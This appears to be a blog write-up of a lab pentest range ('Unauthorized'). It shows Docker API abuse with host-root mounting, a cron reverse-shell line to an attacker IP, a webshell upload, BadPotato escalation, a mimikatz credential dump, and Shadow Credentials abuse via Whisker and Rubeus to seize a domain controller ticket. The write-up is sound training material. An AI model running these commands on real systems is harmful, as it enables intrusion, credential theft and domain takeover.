---
layout: post
title: Unauthorized - 春秋云境
category: [春秋云境]
tags: [active directory pentesting, adcs, shadow credentials]
---

## Introduce

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/4512ce6cb7667e8f.png)

靶标介绍：

Unauthorized是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。

| Intranet Address | Host or FQDN | Description |
| --- | --- | --- |
| 172.22.7.13 | localhost | 外网 docker 宿主机 |
| 172.22.7.67 | WIN-9BMCSG0S.XIAORANG.LAB | IIS + FTP 服务器 |
| 172.22.7.31 | ADCS.XIAORANG.LAB | Active Directory 证书服务 (AD CS) |
| 172.22.7.6  | DC02.XIAORANG.LAB | DC |

## Internet

### Recon - fscan

fscan 扫描结果：
```
   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.1
start infoscan
(icmp) Target xx.xx.xx.xx     is alive
[*] Icmp alive hosts len is: 1
xx.xx.xx.xx:80 open
xx.xx.xx.xx:2375 open
xx.xx.xx.xx:22 open
[*] alive ports len is: 3
start vulscan
[*] WebTitle:http://xx.xx.xx.xx        code:200 len:27170  title:某某装饰
[*] WebTitle:http://xx.xx.xx.xx:2375   code:404 len:29     title:None
[+] http://xx.xx.xx.xx:2375 poc-yaml-docker-api-unauthorized-rce
[+] http://xx.xx.xx.xx:2375 poc-yaml-go-pprof-leak
已完成 3/3
[*] 扫描结束,耗时: 43.4477047s
```

2375 端口通常用于 Docker 的守护进程。通过该端口，Docker 守护进程可以在本地主机或远程主机上接收和处理来自客户端的命令请求。

访问以下 [Docker Engine API](https://docs.docker.com/engine/api/) 路径可以查看主机的一些信息：
```
http://x.x.x.x:2375/debug/pprof/cmdline
http://x.x.x.x:2375/images
http://x.x.x.x:2375/info
http://x.x.x.x:2375/version
```

### Docker API Unauthorized RCE

查看目标主机上所有的 docker 镜像：

```
[root@ecs-403857 ~]# docker -H xx.xx.xx.xx:2375 images -a
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
php                 latest              7988a23aed21        5 months ago        489 MB
mysql               5.7                 34e82e623818        5 months ago        429 MB
ubuntu              latest              27941809078c        6 months ago        77.8 MB
ubuntu              18.04               ad080923604a        6 months ago        63.1 MB
alpine              latest              e66264b98777        6 months ago        5.53 MB
```

直接使用 docker 命令，启动一个容器，并将宿主机的根目录挂载到容器 /mnt 目录中，并获取容器的 shell：
```
docker -H tcp://xx.xx.xx.xx:2375 run -it -v /:/mnt 27941809078c /bin/bash
```

此时我们已经可以管理宿主机的文件系统了，直接将 ssh 公钥进入宿主机：
```
echo "xxxx" >> /mnt/root/.ssh/authorized_keys
```
也可以写入计划任务反弹 shell：
```
echo "*/1  *  *  *  *   /bin/bash -i>&/dev/tcp/<atk_ip>/4444 0>&1" > /mnt/var/spool/cron/root
```

flag 不在 `/root/flag/flag01.txt` 中：
```
root@localhost:~# cat flag/flag01.txt 
 ___  ___  ________   ________  ___  ___  _________  ___  ___  ________  ________  ___  ________  _______   ________     
|\  \|\  \|\   ___  \|\   __  \|\  \|\  \|\___   ___\\  \|\  \|\   __  \|\   __  \|\  \|\_____  \|\  ___ \ |\   ___ \    
\ \  \\\  \ \  \\ \  \ \  \|\  \ \  \\\  \|___ \  \_\ \  \\\  \ \  \|\  \ \  \|\  \ \  \\|___/  /\ \   __/|\ \  \_|\ \   
 \ \  \\\  \ \  \\ \  \ \   __  \ \  \\\  \   \ \  \ \ \   __  \ \  \\\  \ \   _  _\ \  \   /  / /\ \  \_|/_\ \  \ \\ \  
  \ \  \\\  \ \  \\ \  \ \  \ \  \ \  \\\  \   \ \  \ \ \  \ \  \ \  \\\  \ \  \\  \\ \  \ /  /_/__\ \  \_|\ \ \  \_\\ \ 
   \ \_______\ \__\\ \__\ \__\ \__\ \_______\   \ \__\ \ \__\ \__\ \_______\ \__\\ _\\ \__\\________\ \_______\ \_______\
    \|_______|\|__| \|__|\|__|\|__|\|_______|    \|__|  \|__|\|__|\|_______|\|__|\|__|\|__|\|_______|\|_______|\|_______|


flag is not here
root@localhost:~# 
```
在 `/root/.mysql_history` 文件中找到 flag：
```
root@localhost:~# ls -al
total 68
drwx------  7 root root  4096 Jan 12 15:05 .
drwxr-xr-x 18 root root  4096 Jan 12 15:11 ..
-rw-------  1 root root 11470 Jan 12 15:16 .bash_history
-rw-r--r--  1 root root  3106 Dec  5  2019 .bashrc
drwx------  3 root root  4096 May 24  2022 .cache
drwx------  3 root root  4096 Jan 12 15:05 .config
drwxr-xr-x  2 root root  4096 Jul 11  2022 flag
-rw-------  1 root root   917 Jul 11  2022 .mysql_history
drwxr-xr-x  2 root root  4096 May 24  2022 .pip
-rw-r--r--  1 root root   161 Dec  5  2019 .profile
-rw-r--r--  1 root root   206 Jan 12 14:59 .pydistutils.cfg
drwx------  2 root root  4096 May 24  2022 .ssh
-rw-------  1 root root 11243 Jul 11  2022 .viminfo
root@localhost:~# cat .mysql_history 
_HiStOrY_V2_
ls
show\040databases;
use\040secret;
show\040tables
;
select\040*\040from\040f1agggg02;
drop\040table\040f1agggg02;
show\040tables
;
CREATE\040TABLE\040IF\040NOT\040EXISTS\040`f1agggg01`(
\040\040\040`id`\040INT\040UNSIGNED\040AUTO_INCREMENT,
\040\040\040`flag01`\040VARCHAR(100)\040NOT\040NULL,
\040\040\040PRIMARY\040KEY\040(\040`id`\040)
)ENGINE=InnoDB\040DEFAULT\040CHARSET=utf8;
CREATE\040TABLE\040IF\040NOT\040EXISTS\040`f1agggg01`(\040\040\040\040`id`\040INT\040UNSIGNED\040AUTO_INCREMENT,\040\040\040\040`flag01`\040VARCHAR(100)\040NOT\040NULL,\040\040\040\040PRIMARY\040KEY\040(\040`id`\040)\040)ENGINE=InnoDB\040DEFAULT\040CHARSET=utf8;
INSERT\040INTO\040f1agggg01\040(\040id,\040flag01)\040VALUES\040(\040`1`,\040'flag{253812a0-94f0-4753-849c-419181071dbf}');
INSERT\040INTO\040f1agggg01\040(\040id,\040flag01)\040VALUES\040(\0401,\040'flag{253812a0-94f0-4753-849c-419181071dbf}');
clear
exit
root@localhost:~# 
```

## Intranet

使用 fscan 扫描内网：`.\fscan64 -h 172.22.7.6/24`
```

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.1
start infoscan
(icmp) Target 172.22.7.13     is alive
(icmp) Target 172.22.7.6      is alive
(icmp) Target 172.22.7.31     is alive
(icmp) Target 172.22.7.67     is alive
[*] Icmp alive hosts len is: 4
172.22.7.31:135 open
172.22.7.13:22 open
172.22.7.31:139 open
172.22.7.67:135 open
172.22.7.6:139 open
172.22.7.13:2375 open
172.22.7.67:21 open
172.22.7.67:445 open
172.22.7.67:8081 open
172.22.7.6:88 open
172.22.7.67:139 open
172.22.7.6:135 open
172.22.7.67:80 open
172.22.7.6:445 open
172.22.7.31:445 open
172.22.7.13:80 open
[*] alive ports len is: 16
start vulscan
[*] WebTitle:http://172.22.7.13        code:200 len:27170  title:某某装饰
[*] WebTitle:http://172.22.7.67        code:200 len:703    title:IIS Windows Server
[+] NetInfo:
[*]172.22.7.31
   [->]ADCS
   [->]172.22.7.31
[+] NetInfo:
[*]172.22.7.6
   [->]DC02
   [->]172.22.7.6
[+] NetInfo:
[*]172.22.7.67
   [->]WIN-9BMCSG0S
   [->]172.22.7.67
[*] WebTitle:http://172.22.7.13:2375   code:404 len:29     title:None
[*] 172.22.7.67          XIAORANG\WIN-9BMCSG0S
[*] 172.22.7.6     [+]DC XIAORANG\DC02
[*] 172.22.7.31          XIAORANG\ADCS
[*] WebTitle:http://172.22.7.67:8081   code:200 len:4621   title:公司管理后台
[+] ftp://172.22.7.67:21:anonymous
   [->]1-1P3201024310-L.zip
   [->]1-1P320102603C1.zip
   [->]1-1P320102609447.zip
   [->]1-1P320102615Q3.zip
   [->]1-1P320102621J7.zip
   [->]1-1P320102J30-L.zip
[+] http://172.22.7.67:8081/www.zip poc-yaml-backup-file
[+] http://172.22.7.13:2375 poc-yaml-docker-api-unauthorized-rce
[+] http://172.22.7.13:2375 poc-yaml-go-pprof-leak
已完成 15/16 [-] ssh 172.22.7.13:22 admin a11111 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none], no supported methods remain
已完成 16/16
[*] 扫描结束,耗时: 1m16.5631777s
```

### FTP - upload webshell

下载 `http://172.22.7.67:8081/www.zip` 网站备份文件，解压后发现 `/background/download/` 目录下的文件和 ftp 中的文件一致。此时已经知道了 ftp 路径对应的 web 目录，上传 webshell 即可。

连接 webshell 后，使用 Potato 提权：
```
C:/inetpub/wwwroot/background/download/ >.\BadPotato.exe "bindshell.exe"

[*]

    ____            ______        __        __      
   / __ )____ _____/ / __ \____  / /_____ _/ /_____ 
  / __  / __ `/ __  / /_/ / __ \/ __/ __ `/ __/ __ \
 / /_/ / /_/ / /_/ / ____/ /_/ / /_/ /_/ / /_/ /_/ /
/_____/\__,_/\__,_/_/    \____/\__/\__,_/\__/\____/ 

Github:https://github.com/BeichenDream/BadPotato/       By:BeichenDream
            
[*] PipeName : \\.\pipe\4e96beaeddaf413c955a0b6fe72edaa8\pipe\spoolss
[*] ConnectPipeName : \\WIN-9BMCSG0S/pipe/4e96beaeddaf413c955a0b6fe72edaa8
[*] CreateNamedPipeW Success! IntPtr:684
[*] RpcRemoteFindFirstPrinterChangeNotificationEx Success! IntPtr:1502917825120
[*] ConnectNamePipe Success!
[*] CurrentUserName : background
[*] CurrentConnectPipeUserName : SYSTEM
[*] ImpersonateNamedPipeClient Success!
[*] OpenThreadToken Success! IntPtr:856
[*] DuplicateTokenEx Success! IntPtr:860
[*] SetThreadToken Success!
[*] CurrentThreadUserName : NT AUTHORITY\SYSTEM
[*] CreateOutReadPipe Success! out_read:868 out_write:876
[*] CreateErrReadPipe Success! err_read:880 err_write:884
[*] CreateProcessWithTokenW Success! ProcessPid:968
命令成功完成。



[*] Bye!
C:/inetpub/wwwroot/background/download/ > 
```

flag02：
```
flag02: flag{b4094011-aa8f-4476-b526-7d9235e73629}
```

使用 `mimikatz sekurlsa::Kerberos` 导出域用户凭据：
```
Authentication Id : 0 ; 207714 (00000000:00032b62)
Session           : Service from 0
User Name         : zhangfeng
Domain            : XIAORANG
Logon Server      : DC02
Logon Time        : 2022/12/9 15:00:08
SID               : S-1-5-21-224805981-2082735754-3641537343-1110
        kerberos :
         * Username : zhangfeng
         * Domain   : XIAORANG.LAB
         * Password : FenzGTaVF6En
```

### Shadow Credentials

域用户 zhangfeng 属于 Key Admins 组成员，拥有对 msDS-KeyCredentialLink 属性的写入权限；且域环境中存在 AD CS。
使用 Whisker 可直接对目标 msDS-KeyCredentialLink 属性添加 Shadow Credentials：
```
PS C:\Users\zhangfeng\Desktop> .\Whisker.exe add /target:DC02$ /domain:xiaorang.lab /dc:DC02.xiaorang.lab
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password C50PsSwdzccPx5IA
[*] Searching for the target account
[*] Target user found: CN=DC02,OU=Domain Controllers,DC=xiaorang,DC=lab
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 6ec23b70-7ea8-4743-9919-79efb09e2f76
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:DC02$ /certificate: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 /password:"C50PsSwdzccPx5IA" /domain:xiaorang.lab /dc:DC02.xiaorang.lab /getcredentials /show
PS C:\Users\zhangfeng\Desktop> 
```

在生成的 Rubeus 命令后面添加 `/ptt` 参数，将申请到的域控主机 TGT 导入到内存中：

```
PS C:\Users\zhangfeng\Desktop> .\Rubeus.exe asktgt /user:DC02$ /certificate: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 /password:"C50PsSwdzccPx5IA" /domain:xiaorang.lab /dc:DC02.xiaorang.lab /getcredentials /show /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=DC02$
[*] Building AS-REQ (w/ PKINIT preauth) for: 'xiaorang.lab\DC02$'
[*] Using domain controller: 172.22.7.6:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGPDCCBjigAwIBBaEDAgEWooIFVDCCBVBhggVMMIIFSKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+g
      AwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IFDDCCBQigAwIBEqEDAgECooIE+gSCBPbmtnwu
      CJDavT9LRkgDgwinfLz2/CK0P2eytPaEs9wTkCuTFaG3A/M4nKE6b30t6HkX5LYs7V8XeZxhPGsS/jQI
      5Ic396zlTRcXsZme8WkMZvmvI7rkaMTvpZJWlgI3x9Oc0wDsXUz9OVG0mmlC5VQjiUtpqoZuvW+ZS+B/
      13Jw0NQVj2Cmt3Y1RYxtvp9AsSMcD7huILdrQ4QufvEq8AZjUDgzQbxjlx1uTe2l50MBrIkiYSbvLzhV
      1LmwLb5pl1UI+zS336tFBbYjh94bWTb3Q91s6S4FevCl26lnpK7F3zsHfjSzZ3Uamtzt4AYRUXE3Jb9z
      nf0ddCVO7di8IDJ/hOGzOMwUBS8sxCdqy4zRqDvT0/Pp5LA1qa+91ymxUxh7Y+Gjrq8VPL+I64qn/bx3
      VqCZulywLCECm3ECXs1Nx2EfDK9D2SKDngQ3K0ueWWGwhB91BhAtTgiz0P5oK9TRBlKNEUFdFdPcqevm
      6mDy3ZerB5cOV4XEc++vAYZF0zTBDO5k0DnI0g7NjUZdyxLv7Q095mZreun5iWFn7kWsuRAVbkH/lw4Y
      +SIbbCIQZzzvRmLw9zId+DnqV/cG8DHSvaF3sD+tBsz8cssj3vBOIbWKSKANZMxpJs5rSSrtLpHgGvc8
      LyUxOY30ljkZnC1gBU178fD38VqGuRXrCOrQkCXiikb/5Zms9Iw0Oi8asa2vLudAYIVxfnT9qMHcZ73U
      tZtj+amCCSYNLUD/aZI0scePHr7EZ5JD3iZTD4odDsYQuGG3+pA6VRlG8PFVyXjYgK4Wef8t+YredVCH
      uyoAIAV2hCwQjln3Q1Hnr1TgR5hWsbBH4+BK/n7rT195x7xrQZFHVI29ZSVJx282QRXrpueLT5lKD6mf
      sCwxPhyJT6nyP/IfsdWE9DcIYWH1U4RHT38QGer0/wM58jGwCiuz2n7pW6NeM4TJWXTjz8IBDx/4AZ5W
      sRLInlIg9xDZb7VB4lc1hjmqHpn13jz8dVba0p5fLDI2XGBwQnRq2fzwzWkoW3/ELH520UgCcqCWvOe9
      2Hj51tL1rnapgSBOTZ+d6N2mnL6S5j3FfU6NScbi4L8pruG3597z7mPBd4n6YIyMM63usjFWl18ipp3M
      aOiMUxOQQS1ikqGUxrtTLy4M1+kCGZnaPZm7pLS12wDGD2csR44aGVIdZ2EKIzFnDsr7K93L4Tpoyvyl
      JepMJGZH9oLCk1be3ZfViS8G5UFy6i5GrLEDngKcyduQDQ/RHQPXkHCo0+QLR04GeH1tkHKgOXVQXYxt
      F+lVrvaze3ObaQLdIGpsRSmcLTdk4Tr41tgZUbJuB6lf9ob/kjQwvN18znmO6bOeWm0dOQgVMouYijUP
      z36MfUu/g8T7XSukdLITGfhppnCUR1vHvMji/35p6pIIhHpKtTRD/M2JIALrtfWeYlfYw5tA+c+30/mw
      YVGkr1kHb884pgK2GdUZpfbgybDywDZ3UOhwP1dBDMPqhq1n2nC8xJUxZ4z5rzoasYQfLe30HEuyWMql
      vJ3u4xl+UcYKPfaO38Pmn5YbL5bcs8teOf+SaBgJxARSe2W//twhpsfjG4dYel1zczLjMCja1pKqb9ms
      2DEUuuqJdjG46CJPXg3WI8qkxOXAUaWT+GR4dgWqESieoB31md3cDh2s9HBQExexaUZiRaIco/g/vV8U
      ptsrzuEJo4HTMIHQoAMCAQCigcgEgcV9gcIwgb+ggbwwgbkwgbagGzAZoAMCARehEgQQvAVE/WwsDvrI
      8pgRYhCTtaEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAyJKMHAwUAQOEAAKURGA8yMDIz
      MDExMjA4NDMxMlqmERgPMjAyMzAxMTIxODQzMTJapxEYDzIwMjMwMTE5MDg0MzEyWqgOGwxYSUFPUkFO
      Ry5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/xiaorang.lab
  ServiceRealm             :  XIAORANG.LAB
  UserName                 :  DC02$
  UserRealm                :  XIAORANG.LAB
  StartTime                :  2023/1/12 16:43:12
